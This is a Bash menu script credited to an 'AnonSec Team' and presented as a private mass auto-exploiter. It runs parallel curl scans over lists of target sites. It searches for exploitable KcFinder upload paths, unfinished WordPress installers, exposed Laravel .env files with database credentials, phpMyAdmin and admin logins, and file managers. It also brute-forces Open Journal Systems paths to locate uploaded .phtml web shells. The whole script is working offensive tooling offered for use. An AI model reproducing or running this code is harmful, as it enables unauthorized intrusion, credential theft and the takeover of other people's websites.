#!/bin/bash
# Code By L4N4N9_4K1R4
red='\033[0;31m'
cyan='\033[0;36m'
NC='\033[0m'
green='\e[92m'
Green='\e[42m'
lightgreen='\e[1;32m'
okegreen='\e[1;32m'
white='\e[1;37m'
yellow='\e[1;33m'
checking(){
	cekdir="ResultBot"
	if [[ -d "$cekdir" ]];
	then
		echo -e "[+] Directory Result Found"
		clear
	else
		echo -e "[-] Directory Result Not Found"
		sleep 2
		mkdir ResultBot
		touch ResultBot/grabdomainv5.txt
		touch ResultBot/grabipv5.txt
		touch ResultBot/Wp-Install.txt
		touch ResultBot/KcFinder-Vuln.txt
		touch ResultBot/KcFinder-Denied.txt
		touch ResultBot/HasilOJS.txt
		touch ResultBot/HasilOCS.txt
		touch ResultBot/revip.txt
		touch ResultBot/GrabDomainKeyword.txt
		touch ResultBot/Subdo.txt
		touch ResultBot/LaravelENV.txt 
		touch ResultBot/phpmyadmin.txt
		touch ResultBot/RFM.txt
		touch ResultBot/CMSWordPress.txt

		echo -e "[+] Creating Directory"
		sleep 3
		clear
	fi
}
checking
clear
echo "_________________________________________________"
echo -e "-    \e[0;36mWelcome Adventures!\e[0m    			-"
echo "-    1. Mass KcFinder Scanner    		-"
echo "-    2. Mass Wp-Install Finder    		-"
echo "-    3. Mass OJS Scanner    			-"
echo "-    4. Mass Reverse IP    			-"
echo "-    5. GrabDomain    				-"
echo "-    6. GrabDomain From Keyword			-"
echo "-    7. GrabDomain By Zone-Xsec.com		-"
echo "-    8. Subdomain Finder			-"
echo "-    9. OJS Shell Finder			-"
echo "-    10. Admin Finder				-"
echo "-    11. Laravel .env Mass Finder		-"
echo "-    12. Mass phpMyAdmin Finder			-"
echo "-    13. Mass Responsive FileManager		-"
echo "-    14. Dir Finder				-"
echo "-    15. WordPress Cms Checker 			-"
echo "-    0. Keluar    				-"
echo -e "-    \e[0;36mWhat Can I Do For You Adventures?\e[0m    	-"
echo -e "\e[0;36m	Code By Type-0 | AnonSec Team\e[0m"
echo "_________________________________________________"
read -p "Choose Number Of Your Quest: " pilih 
	case $pilih in
	1)
clear
function scan {
	response=$(curl -Lsk $1$2 | grep alert | awk -F "('|')" '{print $2}')
	if [[ $response =~ "nknown error" ]]
	then
		echo -e "\e[92m[Found] $1$2\e[0m"
		echo "https://$1$2" >> ResultBot/KcFinder-Vuln.txt
	elif [[ $response =~ "have permissions" ]]
	then
		echo -e "\e[90m[Permission Denied] $1$2\e"
		echo "https://$1$2" >> ResultBot/KcFinder-Denied.txt
	else
		echo -e "\e[0;31m[Not Found] $1$2\e[0m"
	fi
}
echo -e "\e[0;36m================================================================"
echo -e "Private Tools"
echo -e "Tools: Mass KcFinder Auto Exploiter / Path Finder"
echo -e "Code By L4N4N9_4K1R4"
echo -e "================================================================\e[0m"
echo "We Are Party At Your Security!"
read -p "	Input Your file List: " file
export -f scan

parallel -j 200 scan :::: $file :::: dir.txt

total_result=$(sort -u ResultBot/KcFinder-Vuln.txt | cat ResultBot/KcFinder-Vuln.txt | wc -l)
total_denied=$(sort -u ResultBot/KcFinder-Denied.txt | cat ResultBot/KcFinder-Denied.txt | wc -l)
printf "\e[1;33mResult [$total_result] and Permission Denied [$total_denied] \n";
;; 
	2) 
	clear
function scan {
	response=$(curl -Lsk $1/wp-admin/install.php -L)
	if [[ $response =~ "language-chooser" ]]
	then
		echo -e "\e[93m[Found] $1/wp-admin/install.php\e[0m"
		echo "https://$1/wp-admin/install.php [Forbidden]" >> ResultBot/Wp-Install.txt
	else
		echo -e "\e[0;31m[Not Found] $1/wp-admin/install.php\e[0m"
	fi
}
echo "_____________________________________"
echo -e "    \e[0;36mTools Mass Wp-Install Finder\e[0m"
echo "_____________________________________"
read -p "Input file: " file
export -f scan
parallel -j 200 scan :::: $file
total_wp=$(sort -u ResultBot/Wp-Install.txt | cat ResultBot/Wp-Install.txt | wc -l)
printf "\e[1;33mResult [$total_wp]  \n";
;; 
	3)
	clear
	function scan {
	response=$(curl -Lsk "$1")
	if [[ $response =~ "pkp.sfu.ca/ojs/" ]]
	then
		echo "	[CMS Journals Found] $1"
		ingfo=$(curl -Lsk "$1/files/journals/")
		if [[ $ingfo =~ "ndex of" ]] || [[ $ingfo =~ "orbidden" ]] || [[ $ingfo =~ "403" ]]
		then
			echo -e "\e[42m$1/files/journals  [Path Found]\e[0m"
			echo "https://$1/files/journals" >> ResultBot/HasilOJS.txt
	else
		echo -e "\e[0;31m[Path Not Found] $1\e[0m"
		fi
	fi
}
echo "_____________________________________"
echo -e "    \e[0;36mMass CMS OJS Checker\e[0m"
echo "_____________________________________"
read -p "Input file: " file
export -f scan
parallel -j 200 scan :::: "$file" ::::
total_ojs=$(sort -u ResultBot/HasilOJS.txt | cat ResultBot/HasilOJS.txt | wc -l)
total_ocs=$(sort -u ResultBot/HasilOCS.txt | cat ResultBot/HasilOCS.txt | wc -l)
printf "\e[1;33mResult Dari OJS adalah [$total_ojs] dan dari OCS adalah [$total_ocs] \n";
	;;
	4)
	clear
	echo "_____________________________________"
	echo -e "	  \e[0;36mMass Reverse IP\e[0m"
	echo "_____________________________________"
	scan() {
   domain=$(basename $1)
   date=$(date | awk '{print $4}')
   ip=$(dig +short $domain | head -n 1)
   if [[ -n $ip ]]
   then
      resp=$(curl -m 3 -s http://reverse.fay.gg:18/?ip=$ip | jq -r '.data .domain[]' 2>/dev/null)
      echo "$resp" >> ResultBot/revip.txt
      if [[ -n $resp ]]
      then
         echo -e "\e[93m[$date]\e[0m >> From $domain found \e[92m$(echo "$resp" | wc -l)\e[0m domain"
      else
         echo -e "\e[91m[$date] >> $domain is suck\e[0m"
      fi
   fi
}
export -f scan
read -p "[+] Input File: " file
read -p "[+] Thread: " thread
parallel -j $thread scan :::: "$file"
	;;
	5)
	clear
                         grabber(){
	                         grab(){
	                         	curl_timeout=10
					multithread_limit=50
		                         domen=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -Lsk "https://www.sitelinks.info/domains/.${domain}/$page/" -L | grep -oP "<a href = https://www.sitelinks.info/(.*?)/>" | cut -d "/" -f4)
		                         ip=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -Lsk "https://www.sitelinks.info/domains/.${domain}/$page/" -L | grep -oP "<a href=./api_same_ip/(.*?)/.>" | cut -d "/" -f3)
		                         if [[ $domen =~ '${domain}' || $ip =~ '.' ]];
		                         then
			                         echo "$domen" >> ResultBot/grabdomainv5.txt
			                         echo "$ip" >> ResultBot/grabipv5.txt
			                         regdomen=$(echo "$domen" | wc -l)
			                         regip=$(echo "$ip" | wc -l)
			                         domainnya=$(cat ResultBot/grabdomainv5.txt | wc -l)
			                         ipnya=$(cat ResultBot/grabipv5.txt | wc -l)
			                         echo -e "${okegreen}[+] page : $page | Domain : $regdomen | ip : $regip | total : $domainnya|$ipnya"
		                          else
			                         echo -e "${red}[+] Failed"
		                           fi
	                            }
	
	                         banner(){
	                         echo "_____________________________________"
		                          echo -e "\e[1;92mMass Grabsite V5 Persecond Reload\e[0m"
		                          echo "_____________________________________"
		                          read -p "Masukan Domain : " domain;
		                          read -p "Masukan page : " pagen;
		                          read -p "Sampai page : " pagenya;
	                            }
	                         banner

	                         for page in `seq $pagen $pagenya`;
	                            do
		                          grab $domain
	                         done
                            }
                          grabber
                        ;;
        6)
        clear
        echo "GrabDomain By Keyword. use (+) for space e.g "Lanang+Ganteng""
read -p "Keyword: " key
[[ -z $key ]] && echo "$0 [keyword]" && exit
ctrlc() {
	echo -e "\n\e[91mStopped by user\e[0m"
	rm .temp 2>/dev/null
	exit
}
grabdomain() {
	num=0
	n=(0)
	while [ $num -ne 10000 ]; do
		num=$(($num+10))
		n+=("$num")
	done
	for page in ${n[@]}; do
		result=$(lynx -dump -listonly -nonumbers -hiddenlinks=ignore -useragent="$(shuf -n 1 < .useragent.txt)" https://www.bing.com/search\?q\=$key\&first\=$page\&FORM\=PORE | grep -vE "bing.com|micro|creative|javascript:|msn" | awk -F/ '{print $3}' | sort -u)
		if [[ -n $result ]]; then
			echo "$result" >> .temp
			printf "\r[*] Keyword: $key Found $(sort -u .temp | wc -l) domain"
			trap ctrlc INT
		else
			break
		fi
	done
	if [[ -n $(cat .temp 2>/dev/null) ]]; then
		sort -u .temp >> ResultBot/GrabDomainKeyword.txt
		echo -e "\n[+] Total $(sort -u .temp 2>/dev/null | wc -l) domain"
		echo "[*] tersimpan di ResultBot/GrabDomainKeyword.txt"
	else
		echo "[-] Keyword: $key Not Found"
	fi
	unset num n
}
grabdomain "$key"
rm .temp 2>/dev/null
        ;;
        7)
        clear
        cat .gun
PS3="Select: "
options=("Attacker" "Team")
select opt in ${options[@]}
do
   case $opt in
      "Attacker")
         read -p "input attacker name: " a
         bash .solo.sh $a
      ;;
      "Team")
         read -p "input team name: " t
         bash .team.sh $t
      ;;
      *)
         echo Byee
      ;;
   esac
done
        ;;
        8)
        clear
        echo "1. Single Scan?"
        echo "2. Mass Scan?"
        read -p "Yg Mane?" mane
	case $mane in
	1)
	clear
        echo -ne '\n\r'
url='https://dns.bufferover.run/dns?q=.'
echo -n -e " Masukkan URL (tanpa http/https) : \e[96m"
read target
echo -e "\033[0m Scanning \033[0;36m$target\033[0m"
echo -e "\033[0;31m===========\033[0m Hasil \033[0;31m===========\033[0m"
scan=$url$target
for hasil in $(curl -s $scan | jq -r .FDNS_A[] | sed --separate 's/,/\n/g' | grep $target); do
printf '%s\n' "$hasil"
done
echo -e "\033[0;31m===========\033[0m  ---  \033[0;31m===========\033[0m"
while true; do
	read -p "Mau disimpan dalam bentuk file? y/n : " yn
	case $yn in
		[Yy]* ) for hasil in $(curl -s $scan | jq -r .FDNS_A[] | sed --separate 's/,/\n/g'); do
		printf '%s\n' http://"$hasil"/
		done >> $target.txt; echo -e " OK! File tersimpan \e[96m"ResultBot/$target".txt\e[0m"; break;;
		[Nn]* ) exit;;
		* ) echo -e "Hanya ketik \e[92mY\033[0m atau \e[92mN\033[0m";;
		esac
done
;;
2)
clear
function scan {
 hasil=$(curl -s "https://sonar.omnisint.io/subdomains/$1" | sed --separate 's/,/\n/g' | sed 's|"||g' | grep $1)
 echo -e "\033[0m Scanning \033[0;36m$1\033[0m"
  printf '%s\n' "$hasil" >> ResultBot/Subdomain.txt
 }
  read -p "Masukan DomainList: " file
export -f scan 
parallel -j 10 scan :::: "$file"
  
  
;;
esac
        ;;
        9)
        clear
echo "What is Your OJS Version?"
echo "1. OJS Old Version"
echo "2. OJS New Version"
read -p "Choose: " mana
	case $mana in 
2)
        clear
i=(1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100)
read -p "	Input Your URL: " url
echo "_________________________"
echo "e.g 123-Blablabla-789-21-20221107.phtml. and 123 is Nomer Akun"
read -p "	Nomer Akun: " nomer
echo "_________________________"
echo "e.g 123-Blablabla-789-21-20221107.phtml. and 789-21-20221107.phtml That is Filename"
read -p "	Filename: " FN
for i in ${i[@]}; do
	response=$(curl -Lsk -l $url/files/journals/$i/articles/$nomer/submission/$nomer-$i-$FN)
	if [[ $response =~ "Forbidden" ]] || [[ $response =~ "200 OK" ]] || [[ $response =~ "submit" ]] || [[ $response =~ "Shell" ]] || [[ $response =~ "pload" ]]
	then
		echo -e "\e[92m[Found] $url/files/journals/$i/articles/$nomer/submission/$nomer-$i-$FN\e[0m"
		break
	else
		echo -e "\e[0;31m[Not Found] $url/files/journals/$i/articles/$nomer/submission/$nomer-$i-$FN\e[0m"
			fi
			done
      ;;
1)
         clear
i=(1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100)
read -p "	Input Your URL: " url
echo "_________________________"
echo "e.g 123-456-789-SM.phtml. 123 is Nomer Akun"
read -p "	Nomer Akun: " nomer
echo "_________________________"
echo "e.g 123-456-789-SM.phtml. That is Your FileName"
read -p "	Filename: " FN
for i in ${i[@]}; do
	response=$(curl -Lsk -l $url/files/journals/$i/articles/$nomer/submission/original/$nomer-$FN)
	if [[ $response =~ "Forbidden" ]] || [[ $response =~ "200 OK" ]] || [[ $response =~ "submit" ]] || [[ $response =~ "Shell" ]] || [[ $response =~ "pload" ]]
	then
		echo -e "\e[92m[Found] $url/files/journals/$i/articles/$nomer/submission/original/$nomer-$FN\e[0m"
		break
	else
		echo -e "\e[0;31m[Not Found] $url/files/journals/$i/articles/$nomer/submission/original/$nomer-$FN\e[0m"
			fi
			done
      ;;
      *)
         echo Byee
      ;;
   esac
        ;;
        10)
        clear
read -p "	Input Your URL: " url
for file in $(cat admin.txt); do
	response=$(curl -Lsk -l $url$file)
	if [[ $response =~ "200 OK" ]] || [[ $response =~ "Forbidden" ]] || [[ $response =~ "password" ]] || [[ $response =~ "Username" ]]
	then
		echo -e "\e[92m[Found] $url$file\e[0m"
	else
		echo -e "\e[0;31m[Not Found] $url$file\e[0m"
	fi
	
	done
        ;;
        11)
        clear
echo "Mass .env Laravel Finder"
read -p "List Web: " file
function scan {
path="/.env"
	gas=$(curl -Lsk $1$path)
	if [[ $gas =~ "DB_USERNAME" ]]
	then
		echo -e "\e[42m [Found ENV] $1$path\e[0m"
		echo "https://$1$path" >> ResultBot/LaravelENV.txt
	elif [[ $gas =~ "oot" ]]
	then
		echo -e "\e[92m [ROOT] $1$2 \e[0m"
		echo "$1$2 [ROOT]" >> ResultBot/LaravelENV.txt
	else
		echo -e "\e[0;31m [Not Found] $1$path\e[0m"
	fi
	}
	export -f scan
	parallel -j 200 scan :::: $file ::::
laravel=$(sort -u ResultBot/LaravelENV.txt | cat ResultBot/LaravelENV.txt | wc -l)
	printf "Result For LaravelENV $laravel"
        ;;
        12)
        clear
echo "1. Single Scan"
echo "2. Mass Scan"
read -p "Yang Mana: " incer
case $incer in
1)
clear
read -p "Url: " url
for data in $(cat data.txt); do
	sing=$(curl -Lsk $url$data)
	if [[ $sing =~ "pma_username" ]]
	then
		echo -e "\e[42m [Found] $url$data \e[0m"
	else
		echo -e "\e[0;31m [Not Found] $url$data"
	fi
	done
;;
2)
clear
echo "Mass phpMyAdmin Finder"
read -p "Input Your List: " file
function scan {
	ada=$(curl -Lsk $1$2)
	if [[ $ada =~ "pma_username" ]]
	then
		echo -e "\e[42m [Found] $1$2 \e[0m"
		echo "$1$2" >> ResultBot/phpmyadmin.txt
		return 1
	else
		echo -e "\e[0;31m [Not Found] $1$2 \e[0m"
	fi
	}
		export -f scan
	parallel -j 200 scan :::: $file :::: data.txt	
;;
*)
;;
esac
        ;;
        13)
clear
echo "Mass Responsive FileManager Finder"
read -p "List Web: " file
function scan {
gas=$(curl -Lsk $1$2 -l)
	if [[ $gas =~ "allowed_ext" ]]
	then
		echo -e "\e[42m [Found] $1$2\e[0m"
		echo "https://$1$2" >> ResultBot/RFM.txt
	else
		echo -e "\e[0;31m[Not Found] $1$2\e[0m"
	fi
}
rfm=$(sort -u ResultBot/RFM.txt | cat ResultBot/RFM.txt | wc -l)
export -f scan
parallel -j 200 scan :::: "$file" :::: rfm.txt
printf "Hasil Dari Pencarian Responsive File Manager Anda Adalah [$rfm]"
;;
14)
       clear
read -p "	Input Your URL: " url
for file in $(cat findf.txt); do
	response=$(curl -Lsk -l $url$file)
	if [[ $response =~ "200 OK" ]] || [[ $response =~ "Forbidden" ]] || [[ $response =~ "ndex of" ]]
	then
		echo -e "\e[92m[Found] $url$file\e[0m"
	else
		echo -e "\e[0;31m[Not Found] $url$file\e[0m"
	fi
	
	done
;;
15)
clear
function scan {
	cms=$(curl -Lsk $1/wp-login.php -L)
	if [[ $cms =~ "Powered by WordPress" ]]
	then
		echo -e "\e[92m [WordPress] $1\e[0m"
		echo "$1" >> ResultBot/CMSWordPress.txt
	else
		echo -e "\e[0;31m [OtherCMS] $1\e[0m"
	fi
}
echo "WordPress CMS Scanner"
read -p "List Web: " file

export -f scan
parallel -j 200 scan :::: "$file" ::::
;;
	0) 
	clear 
	echo -e "\e[1;36mGood Bye Adventures!, Don't Forget to Rest, then.. Defeat The Monsters and Save The Villages!\e[0m"
	sleep 6
	clear
	;; 
	*)
	;;
	esac
	
	
